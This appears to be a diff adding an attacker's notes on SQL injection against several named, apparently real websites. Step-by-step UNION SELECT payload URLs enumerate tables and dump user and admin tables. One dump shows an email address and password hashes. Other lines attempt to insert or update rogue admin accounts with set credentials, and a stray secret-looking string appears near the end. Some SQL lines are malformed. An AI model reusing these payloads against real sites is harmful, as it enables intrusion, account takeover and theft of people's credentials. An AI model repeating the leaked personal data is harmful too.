@@ -1,0 +1,141 @@
+http://www.ff-lsb.at/article.show.php?id=2999999.9%27
+
+payload
+-> http://www.ff-lsb.at/article.show.php?id=2999999.9%27 order by 10 --+
+only 9 column exit
+
+-> http://www.ff-lsb.at/article.show.php?id=2999999.9%27%20UNION%20SELECT%201,2,3,4,database(),6,7,8,9%20--+
+vlun is at column 5
+
+-> http://www.ff-lsb.at/article.show.php?id=2999999.9%27%20UNION%20SELECT%201,2,3,4,group_concat(table_name),6,7,8,9 FROM information_schema.tables where table_schema=database() --+
+search table_name
+
+-> http://www.ff-lsb.at/article.show.php?id=2999999.9%27%20UNION%20SELECT%201,2,3,4,group_concat(column_name),6,7,8,9 FROM information_schema.columns where table_name ='users' and table_schema=database() --+
+search column_name
+
+-> http://www.ff-lsb.at/article.show.php?id=2999999.9%27%20UNION%20SELECT%201,2,3,4,group_concat(username,'->',password,'<hr>'),6,7,8,9 FROM users --+
+get username and password from users table
+
+username and password
+m.ehmoser@gmail.com->1a320208d7df10a445b0a36ac4665bad,abartke->73f4c36da5396af50b5a76903a4c9508
+
+get username and password from users table
+
+
+http://www.ff-lsb.at/article.show.php?id=2999999.9%27%20UNION%20SELECT%201,2,3,4,group_concat(INSERT INTO users (username,password) VALUES ('MgMgSirGyi','MgMg@12345')),6,7,8,9 FROM users --+
+
+###################################################################################################################################################################
+
+http://www.ampak.com.tw/product.php?id=2'
+
+payload -> http://www.ampak.com.tw/product.php?id=2 order by 9
+only 8 column exit
+
+-> http://www.ampak.com.tw/product.php?id=-2 UNION SELECT 1,2,3,4,5,6,group_cncat,8 FROM information_schema.tables where table_schema=database() --+
+get table name
+
+-> http://www.ampak.com.tw/product.php?id=-2 UNION SELECT 1,2,3,column_name,5,6,column_name,8 FROM information_schema.columns where table_name='admin' and table_schema=database() --+
+get column name
+
+-> http://www.ampak.com.tw/product.php?id=-2 UNION SELECT 1,2,3,id,5,6,7,8 FROM admin --+
+shwow List
+
+###################################################################################################################################################################
+
+https://www.ifsb.org/implementation.php
+
+sqlmap injection
+
+###################################################################################################################################################################
+
+http://kansascitynova.org/
+
+paylod -> http://kansascitynova.org/news.php?id=42'
+
+payload -> http://kansascitynova.org/news.php?id=42'  order by 7 --+
+only 7 column exit
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(table_name),6,7 FROM information_schema.tables where table_schema=database() --+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(table_name,"<hr>"),6,7 FROM information_schema.tables where table_schema=database() --+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(column_name,"<hr>"),6,7 FROM information_schema.columns where table_name='sadmin_roles' and table_schema=database() --+
+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(column_name,"<hr>"),6,7 FROM information_schema.columns where table_name='sadmin_tables' and table_schema=database() --+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(column_name,"<hr>"),6,7 FROM information_schema.columns where table_name='sadmin_permissions' and table_schema=database() --+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(name,"->",permkey,"->",editable,"<hr>"),6,7 FROM sadmin_permissions  --+
+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(column_name,"<hr>"),6,7 FROM information_schema.columns where table_name='sadmin_roles' and table_schema=database() --+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(column_name,"<hr>"),6,7 FROM information_schema.columns where table_name='sadmin_fields' and table_schema=database() --+
+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(name,"->",displayname,"->",table_id,"->",auto_save_timestamp_update,"<hr>"),6,7 FROM sadmin_fields --+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(column_name,"<hr>"),6,7 FROM information_schema.columns where table_schema=database()   --+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(column_name,"<hr>"),6,7 FROM information_schema.columns where table_schema=database()   --+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(uname,'->',pass,"<hr>"),6,7 FROM information_schema.columns where table_schema=database()   --+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(column_name),6,7 FROM information_schema.columns where table_name='sadmin_users' and table_schema=database() --+
+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(username,'->',email,'->',password,"<hr>"),6,7 FROM sadmin_users --+
+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(username,'->',email,'->',password,"<hr>"),6,7 FROM sadmin_users --+
+
+//insert data 
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(id,'->',fname,'->',lname,'->',username,'->',email,'->',password,'->',role_id,'->',dateadded,'->',lastlogin,"<hr>"),6,7 FROM sadmin_users --+
+
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat(INSERT INTO sadmin_users(id,fname,lname,username,email,password,role_id,dateadded,lastlogin) VALUES (8,'t','z','tzs','tzs@sirgyi.com','madayeloeminaunghlaing',2,'1541977360','1601007267')),6,7  --+
+
+INSERT INTO sadmin_users(id,fname,lname,username,email,password,role_id,dateadded,lastlogin) VALUES (8,'t','z','tzs','tzs@sirgyi.com','madayeloeminaunghlaing',2,'1541977360','1601007267')
+
+//update data
+http://kansascitynova.org/news.php?id=42'  UNION SELECT 1,2,3,4,group_concat("UPDATE sadmin_users SET email='tzs@sirgyi.com' , password='madayeloeminaunghlaing'
+"),6,7  --+
+
+UPDATE sadmin_users SET email="tzs@sirgyi.com" , password="madayeloeminaunghlaing"
+
+
+###############################################################
+
+https://www.bir.gov.ph/
+
+###############################################################
+
+https://www.greenlakecruises.com/purchase.php?id=694&date_id=1778
+
+https://www.fenixlight.com/product/detail/index.php?id=76
+
+
+
+
+
+
+
+
+################################################################################################################
+
+ #=5sqJTm'4SCBdj8T9HwZQfNdcT37C3z
+
+
+Oak Kar
+http://labdope.com/detalheProdutos.php?id=1' --+
+http://labdope.com/detalheProdutos.php?id=1' order by 2 --+
+http://labdope.com/detalheProdutos.php?id=-1%20union%20select%201,version()
+http://labdope.com/detalheProdutos.php?id=-1%20union%20select%201,group_concat(table_name,'<hr>') FROM information_schema.columns where table_schema=database()   --+
+http://labdope.com/detalheProdutos.php?id=-1%20union%20select%201,group_concat(column_name,'<hr>') FROM information_schema.columns where table_name='contato'--+
+http://labdope.com/detalheProdutos.php?id=-1%20union%20select%201,group_concat(id,'<hr>') FROM contato --+
+
+
+
+http://www.jktsiam.com/product_list.php?id=12%20order%20by%2011%20--+
+http://www.jktsiam.com/product_list.php?id=12' union select 1,2,3,4,5,6,7,8,9,10,11 --+
